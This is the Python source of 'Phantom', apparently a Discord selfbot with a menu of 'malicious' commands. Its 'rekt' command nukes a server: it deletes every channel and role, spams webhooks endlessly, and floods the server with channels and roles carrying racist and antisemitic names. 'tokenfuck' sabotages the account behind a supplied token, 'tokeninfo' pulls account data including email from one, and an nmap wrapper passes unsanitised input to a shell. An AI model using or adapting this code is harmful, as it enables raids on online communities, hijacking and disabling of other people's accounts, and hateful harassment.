# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #
# DISCLAIMER:
# - If you skid this, you're gay.
# - If you skid this BUT you give credits to me, you're not.
# - I am not responsible for damage caused to your account if discord disables your account. 
# - Selfbots are against discord TOS, this selfbot is only made for educational purposes only.
# - You can add more commands and/or revamp this as you wish, if you continue to give credit to me (Zenith), the original creator.
# - I might also update this later if i'm bored. This is the code for now. (THIS IS ALSO A BETA VERSION)
# - Lastly, have fun using phantom :D
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

# MODULES
from __future__ import unicode_literals
import asyncio, base64, discord, datetime, time, random, requests, string, os

from colorama import Fore as cc
from discord.ext import commands
from itertools import cycle

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

class SELFBOT():
    __version__ = 1.1

# ============================================================================================================ #

# CONFIG
token = os.environ.get('TOKEN')
prefix = '>'
stream_url = 'https://twitch.tv/#'

# RAID MESSAGE
invite = 'https://discord.gg/mbpm3AtMy9' # <- Server Link #
img = 'https://cdn.discordapp.com/attachments/877383266573881355/898093323867258900/edit2.mp4\nhttps://cdn.discordapp.com/attachments/877383266573881355/898093494156005386/chad_milltary.mp4\nhttps://cdn.discordapp.com/attachments/881354773633302559/900022607364124762/afrikakorps.mp4'
chn = 'https://www.youtube.com/channel/UCBdigW_kb908mCnwRn_OK0A'

messagespam = f'@everyone C4 ON TOP | ZENITH ON TOP\n{invite}\n{img}\n{chn}'

# ============================================================================================================ #

# COLORS
w = W = cc.WHITE
r = DR = cc.RED
g = DG = cc.GREEN
b = DB = cc.BLUE
m = DM = cc.MAGENTA
c = DC = cc.CYAN
y = DY = cc.YELLOW
lr = LR = cc.LIGHTRED_EX
lg = LG = cc.LIGHTGREEN_EX
lb = LB = cc.LIGHTBLUE_EX
lm = LM = cc.LIGHTMAGENTA_EX
lc = LC = cc.LIGHTCYAN_EX
ly = LY = cc.LIGHTYELLOW_EX
re = RE = cc.RESET

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {'hu': 'Hungarian, Hungary', 'nl': 'Dutch, Netherlands', 'no': 'Norwegian, Norway', 'pl': 'Polish, Poland', 'pt-BR': 'Portuguese, Brazilian, Brazil', 'ro': 'Romanian, Romania', 'fi': 'Finnish, Finland', 'sv-SE': 'Swedish, Sweden', 'vi': 'Vietnamese, Vietnam', 'tr': 'Turkish, Turkey', 'cs': 'Czech, Czechia, Czech Republic', 'el': 'Greek, Greece', 'bg': 'Bulgarian, Bulgaria', 'ru': 'Russian, Russia', 'uk': 'Ukranian, Ukraine', 'th': 'Thai, Thailand', 'zh-CN': 'Chinese, China', 'ja': 'Japanese, Japan', 'zh-TW': 'Chinese, Taiwan', 'ko': 'Korean, Korea'}

locales = ['da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl', 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']

randomness = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlkmnopqrstuvwxyz'
randomsymbols = '!@#$%^&*()_+[]'
randomnum = '123456789'
numbers = '1234567890'

# ACTIVATION
phantom = discord.Client()
phantom = commands.Bot(command_prefix=prefix, help_command=None, self_bot=True)
phantom.remove_command('help') # <- Removes default discord.py help command #

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

def tokengener():
    fh = ''.join((random.choices(numbers, k=18)))
    token = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
    return token

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return ''.join(
        random.choice(string.ascii_letters + string.digits)
        for _i in range(random.randint(14, 32)))

def get_user(message, user):
    try:
        member = message.mentions[0]
    except:
        member = message.guild.get_member_named(user)
    if not member:
        try:
            member = message.guild.get_member(int(user))
        except ValueError:
            pass
    if not member:
        return None
    return member

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

@phantom.event
async def on_ready():
  stream = discord.Streaming(
      name = 'PHANTOM | By Zenith <3',
      url = stream_url,
    )
  await phantom.change_presence(activity=stream)
  print(f'''
{b}            ╦═╗ ╗ ╔ ╔═╗ ╦═╗ ╔╦╗ ╔═╗ ╦╦╗{w}
{lb}            ╠═╝ ╠═╣ ╠═╣ ║ ║  ║  ║ ║ {w}
{w}            ╩   ╝ ╚ ╩ ╩ ╝ ╩  ╩  ╚═╝ ╝╝╩{w}

╔ {b}[Phantom]{w}
╠═══════════════════════════════════════════
║ Developer: Zenith/Zephyr 
║ Commands: {len(phantom.commands)}
╚ PHANTOM BETA v{SELFBOT.__version__} 

╔ {b}[Launcher]{w}
╠═══════════════════════════════════════════
║ Logged in as: {phantom.user.name}#{phantom.user.discriminator} 
╚ With your ID: {phantom.user.id} 

╔ {b}[Details]{w}
╠═══════════════════════════════════════════
║ Guilds: {len(phantom.guilds)} 
║ Friends: {len(phantom.user.friends)}
║ Blocked Users: {len(phantom.user.blocked)}
╚ User Nitro: {phantom.user.premium_type}

╔ {b}[Bot Use]{w}
╠═══════════════════════════════════════════
║ Start Time: {start_time} 
║ Bot Prefix: {prefix}
╚ Bot Usage: {prefix}help

{b}Thank you for using phantom <3 | Join my server if you want, https://discord.gg/mbpm3AtMy9{re}

''')

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

@phantom.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f'''```ini\n[PHANTOM] Unknown Command```''')
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(f'''```ini\n[PHANTOM] Missing Permissions```''')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''```ini\n[PHANTOM] Missing Arguments```''')
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f'''```ini\n[PHANTOM] Forbidden Access, {error}```''')
    elif 'Cannot send an empty message' in error_str:
        await ctx.send(f'''```ini\n[PHANTOM] Message content cannot be null```''')
    else:
        await ctx.send(f'''```ini\n[PHANTOM] {error} ```''')

@phantom.event
async def on_relationship_add(friendship):
    print(b + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {re}A friend was added: {friendship.user.display_name}#{friendship.user.discriminator}.")
    
@phantom.event
async def on_guild_join(guild):
    print(b + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {re}A guild was joined: {guild.name}.")
    
@phantom.event
async def on_guild_remove(guild):
    print(b + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {re}A guild was removed: {guild.name}.")
    
@phantom.event
async def on_relationship_remove(friendship):
    print(b + f"\n[{datetime.datetime.now().strftime('%m/%d/%Y, %H:%M:%S %p')}] {re}A friend was removed: {friendship.user.display_name}#{friendship.user.discriminator}.")
    

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

@phantom.command()
async def test(ctx):
    await ctx.message.delete()
    await ctx.send(f'''```ini\n[PHANTOM] System Operational.```''')

@phantom.command(aliases=['h'])
async def help (ctx, category=None):
    if category is None:
        em = discord.Embed(title = f'Phantom BETA v{SELFBOT.__version__} | Help Panel', description = f'`{len(phantom.commands)}` commands available! | Prefix: `{phantom.command_prefix}`\nMade with <3 by Zenith/Zephyr', color = 0x010101, timestamp = ctx.message.created_at)
        em.set_thumbnail(url = 'https://cdn.discordapp.com/attachments/880476776260857916/902217022602104832/Phantom.png')
        em.add_field(name = '`🔮 GENERAL`', value = 'View General Commands')
        em.add_field(name = '`🔮 MALICIOUS`', value = 'View Malicious Commands')
        em.add_field(name = '`🔮 CREDITS`', value = 'Made with <3 by Zenith and Marshal')
        await ctx.send(embed=em, delete_after=60)
    elif str(category).lower() == "general":
        em = discord.Embed(title = f'Phantom BETA v{SELFBOT.__version__} | General Panel', description = f'`{len(phantom.commands)}` commands available! | Prefix: `{phantom.command_prefix}`\nMade with <3 by Zenith/Zephyr', color = 0x010101, timestamp = ctx.message.created_at)
        em.add_field(name = '`🔮 purge <int>`', value = 'Purges message by integer given.')
        em.add_field(name = '`🔮 edittag <msg>`', value = 'Sends the message with glitched edit tag.')
        em.add_field(name = '`🔮 gcname`', value = 'Animates the GC name.')
        em.add_field(name = '`🔮 logguild`', value = 'Logs the information about the guild this command is ran on.')
        em.add_field(name = '`🔮 userinfo <user>`', value = 'Shows userinfo about the mentioned user.')
        em.add_field(name = '`🔮 serverinfo`', value = 'Shows information about the server the command is runned on.')
        em.add_field(name = '`🔮 hookinfo <url>`', value = 'Shows information about the webhook url mentioned.')
        em.add_field(name = '`🔮 hooksend <url> <msg>`', value = 'Sends message using the webhook url mentioned.')
        em.add_field(name = '`🔮 activity <activity>`', value = 'Changes your activity (Playing, Listening, Watching, Streaming, Stop).')
        await ctx.send(embed=em, delete_after=60)
    elif str(category).lower() == "malicious":
        em = discord.Embed(title = f'Phantom BETA v{SELFBOT.__version__} | Malicious Panel', description = f'`{len(phantom.commands)}` commands available! | Prefix: `{phantom.command_prefix}`\nMade with <3 by Zenith/Zephyr', color = 0x010101, timestamp = ctx.message.created_at)
        em.add_field(name = '`🔮 spamall`', value = 'Spams message to all channels in a guild.')
        em.add_field(name = '`🔮 rc <msg>`', value = 'Renames all channels in a guild.')
        em.add_field(name = '`🔮 report <user> <msg_id> <reason>`', value = 'Report the user pinged with information given.')
        em.add_field(name = '`🔮 tokeninfo <token>`', value = 'Shows token information from the given token.')
        em.add_field(name = '`🔮 tokenfuck <token>`', value = 'Disables the token given in the command.')
        em.add_field(name = '`🔮 geoip <ip>`', value = 'Shows information about the given IP.')
        em.add_field(name = '`🔮 nmap <ip>`', value = 'Scans the port of the given IP.')
        em.add_field(name = '`🔮 pingsite <ip>`', value = 'Pings the site given and returs it\'s status.')
        em.add_field(name = '`🔮 rekt`', value = 'Nukes the server the command is runned on.')
        await ctx.send(embed=em, delete_after=60)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

@phantom.command()
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=100).filter(lambda m: m.author == phantom.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == phantom.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass

@phantom.command(aliases=["animategc"])
async def gcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        gcname = "Phantom"
        fullname = ""
        for letter in gcname:
            fullname = fullname + letter
            await ctx.message.channel.edit(name=fullname)

@phantom.command()
async def edittag(ctx, *, message):
    await ctx.message.delete()
    MAGIC_CHAR = '\u202b'
    # credit to checksum
    headers = {'Authorization': token}
    message_ = f'{MAGIC_CHAR} {message} {MAGIC_CHAR}'
    res = requests.post(f'https://discordapp.com/api/v6/channels/{ctx.channel.id}/messages', headers=headers, json={'content': message_})
    if res.status_code == 200:
        message_id = res.json()['id']
        requests.patch(f'https://discordapp.com/api/v6/channels/{ctx.channel.id}/messages/{message_id}', headers=headers, json={'content': ' ' + message_})

@phantom.command()
async def hookinfo(ctx, webhook):
    await ctx.message.delete()
    r = requests.get(webhook).json()
    embed = discord.Embed(title='**Webhook Info**', color=0xFFFAFA, description=f'Name: {r["name"]}\nAvatar: {r["avatar"]}\nID: {r["id"]}\nChannel ID: {r["channel_id"]}\nGuild ID: {r["guild_id"]}\nToken: {r["token"]}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=60)

@phantom.command()
async def hooksend(ctx, webhook, *, message):
    await ctx.message.delete()
    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.send('Webhook is not valid.', delete_after=2)
    else:
        await ctx.send(f'Successfully sent `{message}` to webhook `{webhook}`', delete_after=2)

@phantom.command(aliases=['whois'])
async def userinfo(ctx, member: discord.Member = None):
    await ctx.message.delete()
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed = discord.Embed(color=0xFFFAFA, timestamp=ctx.message.created_at, title=f"**User Info - {member}**")
    embed.set_thumbnail(url=member.avatar_url)

    embed.add_field(name="ID", value=member.id)
    embed.add_field(name="Display Name", value=member.display_name)
    embed.add_field(name="Animated Avatar? ", value=member.is_avatar_animated())
    try:
        embed.add_field(name="Mutual Friends", value=len(await member.mutual_friends()))
    except:
        pass

    embed.add_field(name="Created Account On", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles", value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role", value=member.top_role.mention)
    await ctx.send(embed=embed, delete_after=20)

@phantom.command(aliases=['serverinfo'])
async def guildinfo(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='**Guild Info**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    guild = ctx.message.guild
    embed.add_field(name='**Owner**', value=f'<@{ctx.message.guild.owner_id}>', inline=False)
    embed.add_field(name='**Created At**', value=guild.created_at, inline=False)
    embed.add_field(name='**Amount of Roles**', value=len(guild.roles), inline=False)
    embed.add_field(name='**Amount of Members**', value=len(guild.members), inline=False)
    embed.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=embed, delete_after=60)

@phantom.command(aliases=['logguild'])
async def logserver (ctx):
    await ctx.message.delete()
    guild_name = (ctx.guild.name)
    guild_desc = (ctx.guild.description)
    guild_id = (ctx.guild.id)
    guild_reg = (ctx.guild.region)
    guild_tc = (ctx.guild.text_channels)
    guild_vc = (ctx.guild.voice_channels)
    guild_members = (ctx.guild.member_count)
    guild_roles = (ctx.guild.roles)
    guild_create_at = (ctx.guild.created_at)
    guild_verify =(ctx.guild.verification_level)
    guild_mfa = (ctx.guild.mfa_level)
    guild_owner = (ctx.guild.owner_id)

    print(f'{b}Basic Information{re}')
    print(f'''
    Name | {guild_name}
    Description | {guild_desc}
    ID | {guild_id}
    Region | {guild_reg}
    ''')
    print(f'{b}Stats{re}')
    print(f'''
    Text Channels | {guild_tc}
    Voice Channels | {guild_vc}
    Member Count | {guild_members}
    Roles Count | {guild_roles}
    Created At | {guild_create_at}
    ''')
    print(f'{b}Other Information{re}')
    print(f'''
    Verification Level | {guild_verify}
    MFA Level | {guild_mfa}
    Owner's ID | {guild_owner}
    ''')

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

@phantom.command(aliases=['activity'])
async def act(ctx, *, a=None):
    await ctx.message.delete()
    if a is None:
        game = discord.Game(
            name="PHANTOM | Made by Zenith"
        )
        await phantom.change_presence(activity=game)
    elif str(a).lower() == 'playing':
        game = discord.Game(
            name="PHANTOM | Made by Zenith"
        )
        await phantom.change_presence(activity=game)
    elif str(a).lower() == 'listening':
        await phantom.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name="PHANTOM | Made by Zenith",
        ))
    elif str(a).lower() == 'watching':
        await phantom.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching,
                name="PHANTOM | Made by Zenith",
            ))
    elif str(a).lower() == 'streaming':
        stream = discord.Streaming(
            name="PHANTOM | Made by Zenith",
            url=stream_url,
        )
        await phantom.change_presence(activity=stream)
    elif str(a).lower() == 'stop':
        await phantom.change_presence(activity=None)
    else:
        pass

async def get_portscan(ip):
    results = os.popen(f'nmap {ip}').read()
    return f'```{results}```'

@phantom.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.1.1.1'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@phantom.command()
async def nmap(ctx, ip):
    await ctx.message.delete()
    try:
        results = await get_portscan(ip)
        await ctx.send(results)
    except Exception as e:
        await ctx.send(e)

@phantom.command(aliases=['webping'])
async def pingsite(ctx, *, website):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{b}[ERROR]: {w}{e}" + re)
        if r == 404:
            embed = discord.Embed(title="**Website is down.**", description=f"responded with a status code of {r}",
                                  color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
            await ctx.send(embed=embed, delete_after=60)
        else:
            embed = discord.Embed(title="**Website is online.**", description=f"responded with a status code of {r}",
                                  color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
            await ctx.send(embed=embed, delete_after=60)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

@phantom.command()
async def report(ctx, user: discord.Member=None, mid: str=None, *, reason: str=None):
    await ctx.message.delete()
    if not user and not reason and not mid:
        embed = discord.Embed(title=f'**Error**', color=0xFFFAFA, description=f'there was an error with the command.\nproper command syntax: {phantom.command_prefix}report <user> <msg_id> <reason>')
        await ctx.send(embed=embed, delete_after=60)
    else:
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US',
            'User-Agent': 'Discord/21887 CFNetwork/1197 Darwin/20.0.0',
            'Content-Type': 'application/json',
            'Authorization': token
        }
        json = {
            'channel_id': ctx.channel.id, 
            'message_id': mid, 
            'guild_id': ctx.guild.id, 
            'reason': reason
        }
        r = requests.post('https://discordapp.com/api/v8/report', json=json, headers=headers)
        
        if r.status_code == 201:
            embed = discord.Embed(title=f'**Finished**', color=0xFFFAFA, description=f'report successful with status code {r.status_code}')
            await ctx.send(embed=embed, delete_after=60)
        else:
            embed = discord.Embed(title=f'**Finished**', color=0xFFFAFA, description=f'report failed with status code {r.status_code}')
            await ctx.send(embed=embed, delete_after=60)

@phantom.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
                {'name': 'Flags', 'value': res['flags']},
                {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                {'name': 'Verified', 'value': res['verified']},
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid token")

@phantom.command(aliases=['tfuck'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': True,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible",
        'custom_status': "token fucked by https://github.com/kyliex/nuked"
    }
    guild = {
        'channels': None,
        'icon': "https://i.imgur.com/QHq1tiY.png",
        'name': "PHANTOM",
        'region': "europe"
    }
    for _i in range(100):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{b}[ERROR]: {w}{e}" + re)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{b}[ERROR]: {w}{e}" + re)
            else:
                break

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

@phantom.command()
async def spamall(ctx): 
    await ctx.message.delete()
    count = 0
    for i in range(5):
        try:
            await random.choice(ctx.guild.text_channels).send(messagespam)
            count += 1
            print(f"[+] Message sent: {count}")
        except:
            continue

@phantom.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)

@phantom.command()
async def cdel(ctx):
    for c in ctx.guild.channels:
        try:
            await c.delete()
        except:
            pass

# EDIT THIS AS YOU WISH, I DON'T MIND 
@phantom.command()
async def cspam(ctx):
    for _i in range(25):
        guild = ctx.message.guild
        try:
            await guild.create_text_channel("zenith-was-here")
            await guild.create_text_channel("raided-by-c4")
            await guild.create_text_channel("cotton-fields")
            await guild.create_text_channel("imagine-being-dumb")
            await guild.create_text_channel("ooga-booga")
            await guild.create_text_channel("beat-some-meat")
            await guild.create_text_channel("reopening-auschwitz")
            await guild.create_text_channel("we-own-you")
            await guild.create_text_channel("ooga-booga")
            await guild.create_text_channel("get-deyeeted")
        except:
            pass

@phantom.command()
async def rdel(ctx):
    for roles in list(ctx.guild.roles):
        try:
            await roles.delete()
        except:
            pass

# EDIT THIS AS YOU WISH, I DON'T MIND 
@phantom.command()
async def rspam(ctx):
    for x in range(24):
        try:
            await ctx.create_role("zenith-was-here")
            await ctx.create_role("raided-by-c4")
            await ctx.create_role("cotton-fields")
            await ctx.create_role("imagine-being-dumb")
            await ctx.create_role("ooga-booga")
            await ctx.create_role("beat-some-meat")
            await ctx.create_role("reopening-auschwitz")
            await ctx.create_role("we-own-you")
            await ctx.create_role("ooga-booga")
            await ctx.create_role("get-deyeeted")
        except:
            pass

# EDIT THIS AS YOU WISH, I DON'T MIND 
@phantom.command()
async def hook(ctx):
  global raid
  raid = True
  webhook = discord.utils.get(await ctx.channel.webhooks(), name="C4 WAS HERE")
  try:
    if webhook is None:
      webhook = await ctx.channel.create_webhook(name="C4 WAS HERE")
    while True:
      await webhook.send(content=messagespam)
  except:
    pass

# THANKS MARSHAL FOR FIXING THIS PART OF MY CODE!
@phantom.command()
async def rekt(ctx):
  await ctx.message.delete()
  await hook(ctx)
  await cdel(ctx)
  await cspam(ctx)
  await rdel(ctx)
  await rspam(ctx)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- #

phantom.run(token, bot=False)
